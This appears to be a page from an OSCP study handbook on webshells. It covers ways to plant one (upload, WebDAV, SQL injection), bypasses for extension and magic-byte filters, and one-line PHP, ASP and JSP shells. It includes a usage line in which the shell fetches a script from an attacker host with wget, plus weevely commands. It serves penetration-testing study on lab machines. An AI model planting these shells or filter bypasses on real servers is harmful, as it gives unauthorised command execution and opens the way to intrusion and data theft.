---
title: "Webshells"
slug: webshells
category: notes
handbook: oscp
tags: ["web", "shells"]
draft: false
pubDatetime: 2026-07-18T17:48:53+03:00
modDatetime: 2026-09-13T19:52:38+03:00
description: "A webshell is a small script left on a web server that runs commands sent through web requests."
---
A webshell is a small script left on a web server that runs commands sent through web requests. Planting one converts a file-write or upload flaw into command execution as the web server user, usually `www-data`.

## Getting One Onto the Target

A webshell needs a way to write a file into a served directory:

- **File upload** that allows a script extension, or is tricked into it. See [File Upload](/collections/oscp/file-upload) for the filters and their bypasses.
- **WebDAV** on the web server, where the `PUT` verb writes the file directly and any valid Windows account is a valid WebDAV account. See [WebDAV](/collections/oscp/webdav).
- **SQL injection** with the `FILE` privilege, writing the file with `INTO OUTFILE`. This is how Pebbles planted its shell, detail in [SQL Injection](/collections/oscp/sql-injection) and [MySQL Privilege Escalation](/collections/oscp/mysql-privilege-escalation).
- **Local file inclusion** combined with log or session poisoning.
- Any command execution that can already write a file.

The file has to land where the web server will execute it, a web root such as `/var/www/html`, and be requested over the matching port.

## Extension Filters and What Still Executes

An upload that succeeds proves nothing. Two separate rules decide the outcome: what the application accepts, and what the web server executes. Both are extension lists, and they rarely match.

On Debian and Ubuntu the PHP module hands every file matching this regex to the interpreter:

```apache
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

So `.phar` and `.phtml` execute exactly like `.php`, and a deny list written as "block `.php`" misses both. On Exfiltrated the Subrion file manager accepted `revshell.php`, but requesting it returned an Apache `403 Forbidden` from a rule on the uploads directory. Renaming the same content to `.phar` executed it. Other spellings worth trying when one is blocked: `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, and `.phps`, plus case variations where the filter is case-sensitive.

Read the failure mode, since each one means something different:

- **403 Forbidden**: the file is there and the server refuses to serve that extension. Change the extension.
- **The file downloads instead of running**: no handler is mapped, so it is served as static content. Same fix.
- **404**: the file is not there at all. Either the request points at the wrong path, which is often not the path shown in the admin file manager, or the upload was rejected and the page said so quietly. On MZEEAV the uploader printed one line of text and exited before renaming the file into place, so a refused upload looked identical to a wrong URL.

Filters that check content rather than extension are a separate problem, below.

## Magic Byte Filters

A filter that reads the file instead of the name usually opens the first few bytes and compares them to a signature. This one, the whole of MZEEAV's uploader, only wanted Windows executables:

```php
$F=fopen($tmp_location,"r");
$magic=fread($F,2);
fclose($F);
$magicbytes = strtoupper(substr(bin2hex($magic),0,4));
if ( strpos($magicbytes, '4D5A') === false ) {
    echo "Error no valid PEFILE\n";
    exit ();
}
```

Two bytes, hex-encoded, compared against `4D5A`, which is ASCII `MZ`. Nothing past byte two is looked at.

### Converting the Signature

Filter source states the signature in hex, and the payload has to be built out of bytes. Convert in both directions:

```bash
echo 4D5A | xxd -r -p                       # hex -> MZ
printf 'MZ' | xxd -p                        # MZ  -> 4d5a
python3 -c 'print(bytes.fromhex("4d5a"))'   # b'MZ'
man ascii                                   # the whole table, offline
```

`0x4D` is `M` and `0x5A` is `Z`, which is the DOS header (named after Mark Zbikowski) that every Windows PE still opens with, so any "is this an executable" check looks for it.

When the filter does not say what it wants, take the signature off a real file of that type instead of looking it up:

```bash
xxd sample.pdf | head -n 1
# 00000000: 2550 4446 2d31 2e37 ...  %PDF-1.7
```

`file` decides types from the same signatures, and its database at `/usr/share/misc/magic` (`man 5 magic`) is the full list for anything obscure. CyberChef does the same conversions in a browser when there is no shell handy.

### Prepending It

PHP only interprets what sits between `<?php` and `?>` and echoes everything else verbatim, so the signature goes in front of the payload and the file is still a valid script:

```bash
printf 'MZ\n<?php system($_REQUEST["cmd"]); ?>\n' > shell.php
xxd shell.php | head -n 1
# 00000000: 4d5a 0a3c 3f70 6870 ...  MZ.<?php ...
```

For a payload that already exists, prepend to a copy, since a file cannot be redirected into itself:

```bash
{ printf 'MZ\n'; cat revshell.php; } > revshell-mb.php
sed -i '1i MZ' revshell.php                  # or edit it in place
```

Confirm with `xxd` rather than assuming, since an editor that adds a BOM or a leading newline pushes the signature off byte zero and the check fails for a reason nothing in the error message explains. If `xxd` shows bytes ahead of the signature, strip them:

```bash
sed -i '1{s/^\xef\xbb\xbf//}' revshell.php   # BOM
```

The prepended bytes come back at the top of every response, ahead of the command output. Irrelevant for reading output in a browser, worth remembering when something is parsing the response or when the payload is a reverse shell that should stay quiet.

Signatures worth keeping:

| Type | Bytes | ASCII |
| --- | --- | --- |
| PE / EXE | `4D 5A` | `MZ` |
| GIF | `47 49 46 38 39 61` | `GIF89a` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `.PNG....` |
| JPEG | `FF D8 FF E0` | not printable |
| PDF | `25 50 44 46 2D` | `%PDF-` |

`GIF89a;` is the convenient one, printable ASCII that can be typed straight into a text editor or pasted into a form field. The rest need `printf` with escapes, then the payload concatenated after:

```bash
{ printf '\x89PNG\r\n\x1a\n'; cat payload.php; } > shell.php
```

Two checks defeat a bare stub. `getimagesize()` and `finfo_file()` parse further than the header, so the file has to be a real image carrying the payload instead, either appended to the end or hidden in a metadata field:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real.jpg
cp real.jpg shell.php
```

The `Content-Type` header in the multipart request is a third, separate check that has nothing to do with the file contents. Intercept in Burp and change `application/x-php` to `image/gif` by hand.

Passing the filter is only half of it. The file still has to land somewhere with a PHP handler and be requested with an executing extension, so the failure modes above still apply. When the destination executes nothing, an uploaded `.htaccess` can change which extensions Apache runs there ([File Upload](/collections/oscp/file-upload)). A filter written around contents often has no name check at all, in which case the submitted `.php` name survives into the destination path and no rename is needed. Read the source for both before assuming which half is the problem. If the application consumes the upload rather than serving it, for example a service that runs the uploaded executable, a PHP shell is the wrong payload and the answer is a real msfvenom PE ([msfvenom](/collections/oscp/msfvenom)).

## Minimal Shells

PHP, one line, run through a `cmd` parameter:

```php
<?php system($_GET['cmd']); ?>
```

`passthru`, `shell_exec`, `exec`, and backticks work the same way. When the payload has to squeeze through another sink, for example a SQL `INTO OUTFILE` string already wrapped in single quotes, a shorter form helps. `<?= ... ?>` is the short echo tag and backticks are `shell_exec`, so this whole shell has no single quotes and a one-character parameter:

```php
<?=`$_GET[0]`?>
```

Called as `shell.php?0=id`. This is the exact shell Hawat planted through SQLi.

Equivalents exist for other stacks:

```
<% eval request("cmd") %>                                        (classic ASP)
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>    (JSP)
```

Kali ships a set at `/usr/share/webshells/` for php, asp, aspx, jsp, and perl.

## Using It

Call the command through the parameter, URL-encoding shell metacharacters:

```
http://TARGET/shell.php?cmd=id
http://TARGET/shell.php?cmd=wget+http://KALI/x.sh+-O+/tmp/x.sh
```

Output comes back in the page. Run `whoami` first: the shell executes as whatever user the web service runs as, usually `www-data`, but on a misconfigured host it can be `root`, in which case the box is already finished with no privilege escalation. That was Hawat, where the PHP service ran as root.

A webshell runs one command per request, so it is a command-execution primitive: the next step is almost always a reverse shell through it, covered in [Reverse Shells](/collections/oscp/reverse-shells) and its command-primitive section. The only difference from [Command Injection](/collections/oscp/command-injection) is that a webshell is planted on purpose rather than abusing an existing bug.

## Interactive Webshells

For more than single commands, `weevely` generates an obfuscated PHP shell with an interactive client:

```bash
weevely generate <password> shell.php     # then upload shell.php
weevely http://TARGET/shell.php <password>
```

It gives a shell-like session and is stealthier, but a plain `<?php system() ?>` plus a reverse shell is enough for most boxes.

Kali also ships prebuilt shells per language under `/usr/share/webshells/`, worth checking before writing one from scratch.
